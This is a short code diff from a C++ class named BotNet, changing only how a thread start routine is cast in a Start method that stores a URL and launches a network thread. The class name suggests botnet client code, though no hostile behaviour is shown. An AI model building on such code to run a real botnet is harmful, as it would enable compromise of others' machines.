@@ -35,7 +35,7 @@ void BotNet::ThreadNet(LPVOID Param) {
 
 void BotNet::Start(char* url) {
 	this->url = url;
-	this->hThread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&ThreadNet), (LPVOID)this, 0, 0);
+	this->hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ThreadNet, (LPVOID)this, 0, 0);
 }
 
 void BotNet::Stop() {
